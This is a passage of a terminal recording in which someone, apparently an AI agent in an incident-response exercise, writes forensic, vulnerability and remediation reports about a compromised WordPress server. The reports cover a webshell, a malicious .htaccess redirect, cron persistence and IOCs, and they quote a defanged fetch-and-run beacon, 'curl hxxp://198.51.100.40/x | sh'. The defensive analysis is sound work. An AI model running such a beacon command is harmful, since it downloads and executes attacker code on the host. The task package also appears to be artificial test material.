[146.328404, "o", "### 1. Initial Access & Exploitation (ATT&CK T1190)\r\n\u001b[?2004l\r"]
[146.32845, "o", "\u001b[?2004h> "]
[146.328831, "o", "- **Vector**: Vulnerability in the Contact/School Management plugin (CVE-2022-1609) and concurrent SSH brute-forcing (`/sas/vulns.json:2`, `/disk/var/log/auth.log:146`).\r\n\u001b[?2004l\r"]
[146.328853, "o", "\u001b[?2004h> "]
[146.329103, "o", "- **Origin IP**: `198.51.100.40` (`/disk/var/log/auth.log:196`, `/disk/var/log/nginx/access.log:297`).\r\n\u001b[?2004l\rplification v"]
[146.329141, "o", "\u001b[?2004h"]
[146.329178, "o", "> "]
[146.329258, "o", "- **Evidence**:\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.329401, "o", "  - Web exploitation traffic: `` `/disk/var/log/nginx/access.log:297` ``\r\n\u001b[?2004l\r"]
[146.329446, "o", "\u001b[?2004h"]
[146.329464, "o", "> "]
[146.329646, "o", "  - SSH successful brute force login: `` `/disk/var/log/auth.log:196` ``"]
[146.329659, "o", "\r\n"]
[146.329844, "o", "\u001b[?2004l\r\u001b[?2004h> "]
[146.329895, "o", "  - Vulnerability report: `` `/sas/vulns.json:2` ``\r\n\u001b[?2004l\r"]
[146.32994, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.330098, "o", "### 2. Backdoor & Web Shell Persistence (ATT&CK T1505.003)"]
[146.330127, "o", "\r\n"]
[146.330141, "o", "\u001b[?2004l\r"]
[146.330214, "o", "\u001b[?2004h"]
[146.330327, "o", "> "]
[146.33057, "o", "- **Artifact**: Backdoor planted at `/var/www/html/wp-content/plugins/contact/inc.php`.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.330816, "o", "- **Capability**: Backdoor obfuscation evaluating base64-decoded PHP payloads passed in request bodies (`/disk/var/www/html/wp-content/plugins/contact/inc.php:4`).\r\n\u001b[?2004l\r"]
[146.330854, "o", "\u001b[?2004h"]
[146.330893, "o", "> "]
[146.331063, "o", "- **Alert Status**: Detected by endpoint security (`/sas/alerts.json:2`)."]
[146.331158, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.331336, "o", "- **Evidence**: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``\r\n\u001b[?2004l\r"]
[146.331358, "o", "\u001b[?2004h"]
[146.331393, "o", "> "]
[146.331411, "o", "\r\n"]
[146.331426, "o", "\u001b[?2004l\r"]
[146.33148, "o", "\u001b[?2004h"]
[146.331536, "o", "> "]
[146.331723, "o", "### 3. Internal Defacement (ATT&CK T1491.001)\r\n\u001b[?2004l\rdirect roo"]
[146.331805, "o", "\u001b[?2004h"]
[146.331954, "o", "> "]
[146.332252, "o", "- **Impact**: Default web page replaced with defacement content `hacked=CHK-02`.\r\n\u001b[?2004l\r"]
[146.332299, "o", "\u001b[?2004h"]
[146.332322, "o", "> "]
[146.332455, "o", "- **Artifact**: `/var/www/html/index.html`."]
[146.332472, "o", "\r\n"]
[146.332545, "o", "\u001b[?2004l\r"]
[146.332583, "o", "\u001b[?2004h> "]
[146.332798, "o", "- **Alert Status**: Detected by endpoint security (`/sas/alerts.json:10`).\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.33282, "o", "> "]
[146.332965, "o", "- **Evidence**: `` `/disk/var/www/html/index.html:1` ``"]
[146.333016, "o", "\r\n\u001b[?2004l\r"]
[146.333075, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.333227, "o", "### 4. Malicious Traffic Redirection (ATT&CK T1505.003) — Silent"]
[146.333246, "o", "\r\n"]
[146.333261, "o", "\u001b[?2004l\r"]
[146.333317, "o", "\u001b[?2004h"]
[146.333404, "o", "> "]
[146.333607, "o", "- **Impact**: All web traffic redirected via `.htaccess` RewriteRule to IP `198.51.100.40`.\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.333649, "o", "> "]
[146.333818, "o", "- **Artifact**: `/var/www/html/.htaccess`.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.333982, "o", "- **Alert Status**: **SILENT** (not in `/sas/alerts.json`).\r\n\u001b[?2004l\re"]
[146.334014, "o", "\u001b[?2004h"]
[146.334083, "o", "> "]
[146.334203, "o", "- **Evidence**: `` `/disk/var/www/html/.htaccess:2` ``\r\n\u001b[?2004l\r"]
[146.334232, "o", "\u001b[?2004h"]
[146.334261, "o", "> \r\n\u001b[?2004l\rd"]
[146.334309, "o", "\u001b[?2004h> "]
[146.334509, "o", "### 5. Scheduled Task / Cron Persistence (ATT&CK T1053.003) — Silent\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.334575, "o", "> "]
[146.33574, "o", "- **Impact**: Cron job installed for user `www-data` executing periodic curl beacon to `hxxp://198.51.100.40/x | sh` to re-drop payloads (`xmrig`, `pgdaemon`, `php`, `redis`, `wget`).\r\n\u001b[?2004l\r\u001b[?2004h> - **Artifact**: `/var/spool/cron/crontabs/www-data`.\r\n\u001b[?2004l\r\u001b[?2004h> - **Alert Status**: **SILENT** (not in `/sas/alerts.json`).\r\n\u001b[?2004l\r\u001b[?2004h> - **Evidence**: `` `/disk/var/spool/cron/crontabs/www-data:5` ``\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### 6. Anti-Forensics / Indicator Removal (ATT&CK T1070) — Silent\r\n\u001b[?2004l\r\u001b[?2004h> - **Impact**: Wiped cache binary attempting to obscure C2 beaconing (`198.51.100.40`, `update-wordpress[.]example[.]cn`) and credential cache fragments.\r\n\u001b[?2004l\r\u001b[?2004h> - **Artifact**: `/var/lib/.cache/.wiped.bin`.\r\n\u001b[?2004l\r\u001b[?2004h> - **Alert Status**: **SILENT** (not in `/sas/alerts.json`).\r\n\u001b[?2004l\r\u001b[?2004h> - **Evidence**: `` `/disk/var/lib/.cache/.wiped.bin:1` ``\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Entities & Indicators of Compromise (IOCs)\r\n\u001b[?2004l\r\u001b[?2004h> - **Attacker IP**: `198.51.100.40` (`/disk/var/log/auth.log:196`)\r\n\u001b[?2004l\r\u001b[?2004h> - **C2 Domain**: `update-wordpress.example.cn` (`/disk/var/lib/.cache/.wiped.bin:1`)\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.335822, "o", "> "]
[146.335945, "o", "- **Mining Pool**: `stratum+tcp://xmr.wordpress.evil:3333` (`/sas/cti/advisory.txt:24`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.33609, "o", "- **Wallet Address**: `4A0000000000000000001b88b8daaa21` (`/sas/cti/advisory.txt:25`)\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.336114, "o", "> "]
[146.33616, "o", "\"\"\"\r\n\u001b[?2004l\r"]
[146.336194, "o", "\u001b[?2004h"]
[146.336225, "o", "> "]
[146.336266, "o", "\r\n"]
[146.336279, "o", "\u001b[?2004l\r"]
[146.336302, "o", "\u001b[?2004h"]
[146.33646, "o", "> "]
[146.336496, "o", "vuln_content = \"\"\"# Vulnerability Assessment Report\r\n\u001b[?2004l\r `w"]
[146.336563, "o", "\u001b[?2004h> "]
[146.336578, "o", "\r\n\u001b[?2004l\rp"]
[146.33673, "o", "\u001b[?2004h> "]
[146.336742, "o", "## Entry Vulnerability Analysis\r\n\u001b[?2004l\r|"]
[146.336786, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h"]
[146.336931, "o", "> ### Primary Exploit Vector: CVE-2022-1609\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.337066, "o", "- **Vulnerability Title**: School Management / Contact Plugin Backdoor RCE\r\n\u001b[?2004l\r"]
[146.337238, "o", "\u001b[?2004h> - **CVE ID**: CVE-2022-1609 (`/sas/vulns.json:2`, `/sas/cti/advisory.txt:18`)"]
[146.337302, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.337407, "o", "- **CVSS Score**: 9.8 (CRITICAL) v3.1\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.337601, "o", "- **CWE**: CWE-94 (Improper Control of Generation of Code - Code Injection)\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.337613, "o", "> "]
[146.337933, "o", "- **Affected File Path**: `/var/www/html/wp-content/plugins/contact/inc.php` (`/disk/var/www/html/wp-content/plugins/contact/inc.php:4`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.338297, "o", "- **Description**: The plugin contains obfuscated backdoor functionality injected into license-checking code that registers a REST API handler, allowing unauthenticated remote attackers to execute arbitrary PHP code.\r\n\u001b[?2004l\r"]
[146.338524, "o", "\u001b[?2004h> "]
[146.338536, "o", "- **Evidence Path**: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.338753, "o", "- **Alert Reference**: `` `/sas/vulns.json:2` `` and `` `/sas/alerts.json:2` ``\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\re"]
[146.338766, "o", "\u001b[?2004h> "]
[146.338978, "o", "### Secondary Vector: SSH Authentication Weakness\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.339111, "o", "- **Description**: Weak SSH root account password permitted successful brute-force authentication from external IP `198.51.100.40`.\r\n\u001b[?2004l\ra"]
[146.339143, "o", "\u001b[?2004h> "]
[146.339312, "o", "- **Evidence Path**: `` `/disk/var/log/auth.log:196` ``\r\n\u001b[?2004l\r/wp-conte\u001b[?2004h> \"\"\"\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.339363, "o", "> \r\n\u001b[?2004l\rl"]
[146.339496, "o", "\u001b[?2004h> "]
[146.339542, "o", "baseline_content = \"\"\"# Baseline and Configuration Weakness Report\r\n\u001b[?2004l\r fro"]
[146.339601, "o", "\u001b[?2004h> \r\n\u001b[?2004l\rm"]
[146.339726, "o", "\u001b[?2004h> "]
[146.339765, "o", "## Identified Baseline Deficiencies\r\n\u001b[?2004l\r"]
[146.339889, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r:\u001b[?2004h> "]
[146.339962, "o", "### 1. Weak Database Credentials & Insecure Configuration (BAS-01)\r\n\u001b[?2004l\r"]
[146.340005, "o", "\u001b[?2004h> "]
[146.340115, "o", "- **Check ID**: CHK-05 / BAS-01\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.340242, "o", "> - **Path**: `/var/www/html/wp-config.php`\r\n\u001b[?2004l\rh"]
[146.340257, "o", "\u001b[?2004h> "]
[146.34037, "o", "- **Weakness Details**:\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.340523, "o", "  - Weak database password (`DB_PASSWORD`) configured in plain text.\r\n\u001b[?2004l\r"]
[146.340618, "o", "\u001b[?2004h> "]
[146.34077, "o", "  - WordPress XML-RPC endpoint enabled, exposing the site to brute-force attacks and amplification vectors.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.340907, "o", "- **Evidence Path**: `` `/disk/var/www/html/wp-config.php:4` ``\r\n\u001b[?2004l\rat"]
[146.341022, "o", "\u001b[?2004h> "]
[146.341107, "o", "- **SAS Alert Reference**: `` `/sas/alerts.json:18` `` and `` `/sas/baseline.json:2` ``\r\n\u001b[?2004l\rig` "]
[146.341183, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.34137, "o", "### 2. Insecure File Permissions & Web Root Writeability\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.341531, "o", "- **Path**: `/var/www/html/.htaccess` and `/var/www/html/wp-content/plugins/`\r\n\u001b[?2004l\r"]
[146.341601, "o", "\u001b[?2004h> "]
[146.341918, "o", "- **Weakness Details**: Web server user (`www-data`) had excessive write privileges allowing creation/modification of `.htaccess` redirects and PHP webshell files.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.342097, "o", "- **Evidence Path**: `` `/disk/var/www/html/.htaccess:2` `` and `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.342193, "o", "\r\n\u001b[?2004l\r'\u001b[?2004h> "]
[146.342271, "o", "### 3. Direct Root SSH Password Login Enabled\r\n\u001b[?2004l\r"]
[146.342304, "o", "\u001b[?2004h> "]
[146.342386, "o", "- **Path**: `/var/log/auth.log`\r\n\u001b[?2004l\r"]
[146.342466, "o", "\u001b[?2004h> "]
[146.342647, "o", "- **Weakness Details**: SSH configuration allowed direct root login via password authentication over public network interfaces.\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.34273, "o", "> "]
[146.342785, "o", "- **Evidence Path**: `` `/disk/var/log/auth.log:196` ``\r\n\u001b[?2004l\rf.write(remedi"]
[146.342826, "o", "\u001b[?2004h"]
[146.34297, "o", "> \"\"\"\r\n\u001b[?2004l\ratio\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.343045, "o", "remediation_content = \"\"\"# Remediation and Response Plan"]
[146.343091, "o", "\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.343198, "o", "> \r\n\u001b[?2004l\rc\u001b[?2004h> "]
[146.343326, "o", "## Change Ticket Reconciliation (CHG-1481)\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.343548, "o", "Reconciled changes based on forensic findings from `/disk` and threat intelligence in `/sas`:\r\n\u001b[?2004l\r"]
[146.34356, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.343664, "o", "| # | Action | Target | Status | Rationale & Cited Evidence |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.343865, "o", "|---|--------|--------|--------|----------------------------|\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.344101, "o", "| 1 | Block source IP inbound | `198.51.100.40` | PROPOSED | Corrected from `203.0.113.9`. True attacker origin IP identified across auth logs and web logs. Citation: `` `/disk/var/log/auth.log:196` `` |\r\n\u001b[?2004l\r"]
[146.344216, "o", "\u001b[?2004h> "]
[146.344483, "o", "| 2 | Patch plugin RCE (CVE-2022-1609) | `/var/www/html/wp-content/plugins/contact` | PROPOSED | Corrected from CVE-2019-0708 (BlueKeep). Patch or remove vulnerable contact plugin. Citation: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` `` |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.344921, "o", "| 3 | Remove cron persistence | `/var/spool/cron/crontabs/www-data` | OPEN | Downgraded from DONE to OPEN. Crontab for `www-data` still contains active beacon command `curl hxxp://198.51.100.40/x`. Citation: `` `/disk/var/spool/cron/crontabs/www-data:5` `` |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.3452, "o", "| 4 | Quarantine webshell backdoor | `/var/www/html/wp-content/plugins/contact/inc.php` | PROPOSED | Backup and quarantine the webshell file instead of unverified deletion. Citation: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` `` |\r\n\u001b[?2004l\r"]
[146.345247, "o", "\u001b[?2004h> "]
[146.345578, "o", "| 5 | Remove malicious `.htaccess` redirect | `/var/www/html/.htaccess` | PROPOSED | Remove RewriteRule redirecting traffic to attacker IP `198.51.100.40`. Citation: `` `/disk/var/www/html/.htaccess:2` `` |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.34581, "o", "| 6 | Restore defaced web index | `/var/www/html/index.html` | PROPOSED | Replace defaced `index.html` with clean backup version. Citation: `` `/disk/var/www/html/index.html:1` `` |\r\n\u001b[?2004l\r"]
[146.345855, "o", "\u001b[?2004h> "]
[146.347721, "o", "| 7 | Harden `wp-config.php` & disable XML-RPC | `/var/www/html/wp-config.php` | PROPOSED | Update weak DB password and disable XML-RPC API. Citation: `` `/disk/var/www/html/wp-config.php:4` `` |\r\n\u001b[?2004l\r\u001b[?2004h> | 8 | Disable root SSH password login & rotate keys | `/etc/ssh/sshd_config` | PROPOSED | Prevent SSH password brute-force access; require SSH key auth and disable direct root login. Citation: `` `/disk/var/log/auth.log:196` `` |\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Actionable Remediation Sequence\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> 1. **Containment & Network Isolation**\r\n\u001b[?2004l\r\u001b[?2004h>    - Add firewall rule blocking inbound/outbound traffic for IP `198.51.100.40` (Citation: `` `/disk/var/log/auth.log:196` ``).\r\n\u001b[?2004l\r\u001b[?2004h>    - Block domain `update-wordpress.example.cn` at DNS/firewall level (Citation: `` `/disk/var/lib/.cache/.wiped.bin:1` ``).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> 2. **Persistence Removal & Web Restoration (Prefer Backup/Quarantine over Deletion)**\r\n\u001b[?2004l\r\u001b[?2004h>    - Backup and remove cron job line from `/var/spool/cron/crontabs/www-data` (Citation: `` `/disk/var/spool/cron/crontabs/www-data:5` ``).\r\n\u001b[?2004l\r\u001b[?2004h>    - Move `/var/www/html/wp-content/plugins/contact/inc.php` to isolated quarantine storage (Citation: `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``).\r\n\u001b[?2004l\r\u001b[?2004h>    - Remove malicious RewriteRule from `/var/www/html/.htaccess` (Citation: `` `/disk/var/www/html/.htaccess:2` ``).\r\n\u001b[?2004l\r\u001b[?2004h>    - Restore `/var/www/html/index.html` from clean backup (Citation: `` `/disk/var/www/html/index.html:1` ``).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> 3. **System Hardening & Vulnerability Patching**\r\n\u001b[?2004l\r\u001b[?2004h>    - Update or remove vulnerable WordPress plugin (CVE-2022-1609) (Citation: `` `/sas/vulns.json:2` ``).\r\n\u001b[?2004l\r\u001b[?2004h>    - Update `wp-config.php` with strong database password and disable XML-RPC functionality (Citation: `` `/disk/var/www/html/wp-config.php:4` ``).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.347869, "o", "   - Configure `/etc/ssh/sshd_config` to `PermitRootLogin no` and `PasswordAuthentication no` (Citation: `` `/disk/var/log/auth.log:196` ``).\r\n\u001b[?2004l\r"]
[146.347904, "o", "\u001b[?2004h> "]
[146.347948, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[146.348026, "o", "4. **Verification & Monitoring**\r\n\u001b[?2004l\r"]
[146.348072, "o", "\u001b[?2004h> "]
[146.348196, "o", "   - Verify crontab cleanliness: `crontab -u www-data -l`.\r\n\u001b[?2004l\r"]
[146.348264, "o", "\u001b[?2004h> "]
[146.348352, "o", "   - Monitor Nginx access logs for suspicious POST requests.\r\n\u001b[?2004l\r"]
[146.34839, "o", "\u001b[?2004h"]
[146.348433, "o", "> "]
[146.348546, "o", "   - Run baseline integrity check on web directory files.\r\n\u001b[?2004l\r"]
[146.348574, "o", "\u001b[?2004h"]
[146.348624, "o", "> \"\"\"\r\n\u001b[?2004l\r\u001b[?2004h"]
[146.348653, "o", "> \r\n\u001b[?2004l\r"]
[146.34869, "o", "\u001b[?2004h"]
